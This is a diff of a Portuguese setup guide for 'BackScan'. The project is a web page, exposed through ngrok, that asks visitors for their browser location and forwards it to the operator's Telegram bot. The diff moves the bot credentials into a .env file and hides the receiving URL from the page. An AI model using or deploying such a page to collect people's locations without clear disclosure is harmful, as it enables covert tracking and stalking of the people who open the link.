@@ -67,22 +67,44 @@ npm install
 
 ---
 
-## 6. Configurar as Variáveis do Projeto
-Edite o arquivo `server.js`:
+## 6. Criar e Configurar as Variáveis de Ambiente `.env`
+
+Crie o arquivo `.env` na raiz do projeto:
 
 ```bash
-nano server.js
+touch .env
+nano .env
 ```
 
-Substitua **BOT-TOKEN** pelo token do seu bot do Telegram.
+Cole as variáveis abaixo substituindo pelos seus valores:
 
-Substitua **CHAT-TOKEN** pelo ID do chat ou grupo onde deseja receber as mensagens.
+```env
+TELEGRAM_BOT_TOKEN=SEU_TOKEN_DO_BOT_AQUI
+TELEGRAM_CHAT_ID=SEU_CHAT_ID_AQUI
+```
 
-Pressione **CTRL + X**, depois **Y** e **Enter** para salvar.
+Salve com **CTRL + X**, depois **Y** e **Enter**.
 
 ---
 
-## 7. Criar e Configurar um Bot no Telegram
+## 7. Editar o `server.js` para Usar `.env`
+
+No início do `server.js`, adicione:
+
+```js
+require("dotenv").config();
+```
+
+E substitua as linhas do token e chat ID por:
+
+```js
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+```
+
+---
+
+## 8. Criar e Configurar um Bot no Telegram
 
 1. No Telegram, procure por **@BotFather**.
 2. Envie o comando:
@@ -101,7 +123,7 @@ Pressione **CTRL + X**, depois **Y** e **Enter** para salvar.
 
 ---
 
-## 8. Iniciar o Servidor
+## 9. Iniciar o Servidor
 
 ```bash
 node server.js
@@ -111,10 +133,10 @@ Se tudo estiver correto, a saída deve indicar que o servidor está rodando.
 
 ---
 
-## 9. Instalar e Configurar o Ngrok
+## 10. Instalar e Configurar o Ngrok
 O **Ngrok** é usado para expor o servidor local para a internet.
 
-### 9.1 Baixar e Instalar o Ngrok
+### 10.1 Baixar e Instalar o Ngrok
 ```bash
 wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
 unzip ngrok-stable-linux-amd64.zip
@@ -122,7 +144,7 @@ chmod +x ngrok
 sudo mv ngrok /usr/local/bin/
 ```
 
-### 9.2 Criar Conta no Ngrok
+### 10.2 Criar Conta no Ngrok
 Acesse [https://ngrok.com/](https://ngrok.com/) e crie uma conta.
 
 Após criar a conta, pegue seu **Authtoken** e rode:
@@ -132,7 +154,7 @@ ngrok authtoken SEU_AUTHTOKEN
 
 ---
 
-## 10. Expor o Servidor com o Ngrok
+## 11. Expor o Servidor com o Ngrok
 
 ```bash
 ngrok http 8088
@@ -142,21 +164,21 @@ Copie a **URL gerada pelo Ngrok** (exemplo: `https://abc123.ngrok.io`).
 
 ---
 
-## 11. Atualizar a URL no Projeto
-Abra o arquivo `index.html`:
-```bash
-nano index.html
-```
-Substitua `https://abc123.ngrok.io` pela URL gerada pelo Ngrok:
+## 12. Atualizar o `index.html` com URL Local
+
+No `index.html`, troque:
+
 ```js
-fetch("https://abc123.ngrok.io/send-location", {
+fetch("https://abc123.ngrok.io/send-location")
 ```
-Salve as alterações (**CTRL + X**, **Y**, **Enter**).
 
----
+por:
 
-## 12. Testar o Projeto
-Abra o **index.html** no navegador e permita o acesso à localização. Se tudo estiver correto, a localização será enviada para o bot no Telegram.
+```js
+fetch("/send-location")
+```
+
+Isso permite que a URL real fique oculta no servidor.
 
 ---
 
@@ -189,5 +211,5 @@ Agora qualquer pessoa pode acessar sua página! 🚀
 ---
 
 ## Conclusão
-Agora você tem o projeto BackScan rodando do zero no Ubuntu, mesmo sem experiência em programação. 🚀
+Agora você tem o projeto BackScan rodando do zero no Ubuntu, com variáveis de ambiente protegendo seus dados sensíveis. 🚀
 
